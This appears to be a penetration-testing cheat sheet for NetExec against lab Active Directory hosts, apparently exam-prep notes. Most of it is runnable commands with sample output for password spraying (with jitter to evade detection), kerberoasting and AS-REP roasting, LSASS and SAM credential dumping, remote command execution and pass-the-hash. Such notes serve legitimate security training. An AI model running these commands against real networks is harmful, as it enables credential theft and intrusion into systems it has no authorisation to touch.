# NXC (NetExec) — SMB Credential Testing & Post-Exploitation

NetExec (`nxc`) is a network exploitation tool for Windows/AD environments. It replaced CrackMapExec (CME).
Think of it as: authenticate to a machine → do something with that access.

---

## Understanding Output Symbols
```
[*]  = Informational (just telling you something happened)
[+]  = Success (auth worked)
[-]  = Failed or warning

(Pwn3d!)     = You are local admin — you can run commands, dump creds, etc.
(no output)  = Valid creds, but not admin
```

---

## Protocols

nxc supports: smb, ldap, winrm, wmi, mssql, ssh, ftp, vnc, rdp, nfs

---

## Basic Syntax
```
nxc <protocol> <target(s)> -u <user> -p <password>
```

---

## Protocol Examples

### SMB (port 445) — Windows file sharing, most common for AD attacks
```bash
# Confirms connection
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
# Example Result:
# [+] oscp.exam\Eric.Wallows:EricLikesRunning800 (signing:False) (SMBv1:None)
# (Pwn3d!) = local admin, (no output after +) = valid creds but not admin
# What to do next? If Pwn3d! proceed to credential dumping. If not, proceed to share enumeration.

# List all SMB shares and permissions
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --shares
# Example Result:
# Share        Permissions    Remark
# -----        -----------    ------
# ADMIN$                      Remote Admin
# C$                          Default share
# IPC$         READ           Remote IPC
# Documents    READ
# What to do next? Note any shares with READ or WRITE. Connect to them via smbclient below.

# Connect to a specific share via smbclient
smbclient -N \\\\192.168.158.159\\Documents -U oscp/Eric.Wallows%'EricLikesRunning800'
# Example Result:
# Try "help" to get a list of commands.
# smb: \>
# What to do next? You are now inside the share. Use the commands below to navigate.

# List files and folders
ls

# Change directory
cd <foldername>

# Go back a directory
cd ..

# Download a single file
get backup-sept-2025.zip

# Upload a file
put nc.exe

# Download all files recursively (bulk download everything in the share)
mask ""
recurse ON
prompt OFF
mget *
# What to do next? Files saved to your current local directory. Inspect them for credentials or sensitive data.

# Recursive listing only (no download) — see all files and folders without downloading
recurse ON
ls
# What to do next? Review file names for anything interesting before deciding what to download.

# Exit smbclient
exit
```

### LDAP (port 389) — Query Active Directory directly (users, groups, policies)
```bash
# Confirms connection
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777'
# Example Result:
# [+] oscp.exam\o.foller:EarlyMorningFootball777 (signing:False) (SMBv1:None)
# What to do next? Proceed to enumeration commands below.

# Export all domain users to a file
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --users-export users.txt
# Example Result:
# [*] Writing 25 domain users to users.txt
# What to do next? Use users.txt for password spraying:
nxc smb 192.168.158.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Enumerate all domain users (prints to screen)
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --users
# Example Result:
# administrator
# guest
# o.foller
# j.smith
# What to do next? Copy usernames into a wordlist and use for password spraying.

# Enumerate all domain groups
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --groups
# Example Result:
# Domain Admins
# Backup Operators
# Remote Desktop Users
# What to do next? Note any interesting groups. Check which users belong to privileged groups.

# Enumerate all domain computers
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --computers
# Example Result:
# DC01.oscp.exam
# SRV22.oscp.exam
# WS26.oscp.exam
# What to do next? Add discovered hostnames/IPs to your target list for further enumeration.

# Find privileged accounts (adminCount=1)
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --admin-count
# Example Result:
# Administrator
# j.smith
# What to do next? Prioritize cracking or spraying these accounts. Any Pwn3d! on these is high value.

# Find accounts trusted for Kerberos delegation (often exploitable)
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --trusted-for-delegation
# Example Result:
# SRV22$ (computer account trusted for delegation)
# What to do next? Follow up with a Kerberos delegation attack. See Kerberos section of notes.

# Find accounts that do not require a password
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --password-not-required
# Example Result:
# j.smith (PASSWD_NOTREQD)
# What to do next? Try logging in with an empty password:
nxc smb 192.168.158.158 -u 'j.smith' -p ''

# Find accounts vulnerable to AS-REP roasting
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M asreproast
# Example Result:
# $krb5asrep$23$j.smith@oscp.exam:a3f1c2d4...
# What to do next? Crack the hash with hashcat:
hashcat -m 18200 <HASH_FILE> /usr/share/wordlists/rockyou.txt

# Find kerberoastable service accounts
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M kerberoast
# Example Result:
# $krb5tgs$23$*svc_backup$oscp.exam*$a1b2c3...
# What to do next? Crack the hash with hashcat:
hashcat -m 13100 <HASH_FILE> /usr/share/wordlists/rockyou.txt

# Check what groups a specific user belongs to
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M groupmembership -o USER=j.smith
# Example Result:
# j.smith is member of: Domain Admins, Remote Desktop Users
# What to do next? If in Domain Admins -> high priority target. If in Backup Operators -> see privilege escalation notes.

# Collect Bloodhound data for the entire AD domain (no file transfer needed)
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' --bloodhound --collection All --dns-server <DC IP>
# Example Result:
# Resolved collection methods: acl, trusts, rdp, psremote, localadmin, dcom, objectprops, group, session
# Done in 0M 14S
# Compressing output into /home/kali/.nxc/logs/<filename>_bloodhound.zip
# What to do next? Import the .zip file into Bloodhound:
# 1. Open Bloodhound in your browser
# 2. Click Upload Data
# 3. Select the .zip file from /home/kali/.nxc/logs/
# 4. Analyse attack paths, GenericAll, WriteDACL, and path to Domain Admin
```

### WinRM (port 5985) — Windows Remote Management, used by Evil-WinRM
```
nxc winrm 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### WMI (port 135) — Windows Management Instrumentation, remote command execution
```
nxc wmi 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### MSSQL (port 1433) — Microsoft SQL Server
```
nxc mssql 192.168.158.159 -u 'sa' -p 'Password123'
```

### SSH (port 22) — Linux or Windows SSH
```
nxc ssh 192.168.158.159 -u 'root' -p 'Password123'
```

### FTP (port 21) — File Transfer Protocol, check for anonymous access
```
nxc ftp 192.168.158.159 -u 'anonymous' -p ''
```

### VNC (port 5900) — Virtual Network Computing, remote desktop
```
nxc vnc 192.168.158.159 -u 'admin' -p 'Password123'
```

### RDP (port 3389) — Remote Desktop Protocol
```
nxc rdp 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800'
```

### NFS (port 2049) — Network File Share, common on Linux
```
nxc nfs 192.168.158.159 -u '' -p ''
```

---

## Modules (-M flag)

Modules are protocol-specific. Not every module works on every protocol.
Always check what's available for the protocol you're using:
```
nxc smb -L       <- list all SMB modules
nxc ldap -L      <- list all LDAP modules
nxc ssh -L       <- etc.
```

Run multiple modules in one command:
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy -M spider_plus
```

---

## SMB Modules

### lsassy — Dump credentials from LSASS memory (requires Pwn3d!)
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M lsassy
```
- Reads LSASS process in memory (stores creds of logged-in users)
- Returns: plaintext passwords, NTLM hashes, Kerberos tickets
- Tickets saved to: /home/kali/.nxc/modules/lsassy

### nanodump — Alternative LSASS dumper if lsassy fails
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M nanodump
```

### spider_plus — List and index all readable SMB shares and files
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M spider_plus
```

### gpp_password — Find passwords stored in Group Policy Preferences (classic vuln)
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M gpp_password
```

### zerologon / petitpotam / nopac — Check if DC is vulnerable
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M zerologon
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M petitpotam
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M nopac
```

### enum_av — Detect antivirus / endpoint protection on the target
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M enum_av
```

### webdav — Check if WebClient service is running (used in relay attacks)
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M webdav
```

### eventlog_creds / powershell_history / wifi / winscp — Misc cred hunting
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M powershell_history
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M wifi
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -M winscp
```

---

## LDAP Modules

### get-desc-users — Read user account descriptions (sometimes contain passwords!)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M get-desc-users
```

### maq — Check MachineAccountQuota (can you add computers to domain?)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M maq
```

### adcs — Enumerate Active Directory Certificate Services (AD CS)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M adcs
```

### ldap-checker — Check if LDAP signing/binding is enforced
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M ldap-checker
```

### pre2k — Check for pre-Windows 2000 compatible accounts (weak auth)
```
nxc ldap 192.168.158.158 -u 'o.foller' -p 'EarlyMorningFootball777' -M pre2k
```

---

## WinRM — No modules, but supports direct cred dumping flags
```
nxc winrm 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam
nxc winrm 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --lsa
```

---

## Credential Dumping (built-in flags, no module needed)

These work directly on SMB with Pwn3d! access:
```
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --sam
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --lsa
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' --dpapi
```

---

## Running Commands (requires Pwn3d!)
```
# CMD command
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -x 'whoami'

# PowerShell command
nxc smb 192.168.158.159 -u 'Eric.Wallows' -p 'EricLikesRunning800' -X 'Get-LocalUser'
```

---

## Pass-the-Hash (PTH)

Use an NTLM hash instead of a password — works anywhere -p works:
```
nxc smb 192.168.158.158 -u 'Administrator' -H 'a1fcb4118dfcbf52a53d6299aab57055'
nxc smb 192.168.158.0/24 -u 'Administrator' -H 'a1fcb4118dfcbf52a53d6299aab57055'
```

---

## Password Spraying Tips
```
# Spray one password across many users (add --continue-on-success to not stop at first hit)
nxc smb 192.168.158.0/24 -u users.txt -p 'Password123!' --continue-on-success

# Spray across multiple IPs
nxc smb 192.168.158.158 192.168.158.159 192.168.158.160 -u 'o.foller' -p 'EarlyMorningFootball777'

# Add jitter to avoid detection (5 second random delay between attempts)
nxc smb 192.168.158.0/24 -u users.txt -p passwords.txt --jitter 5
```

---
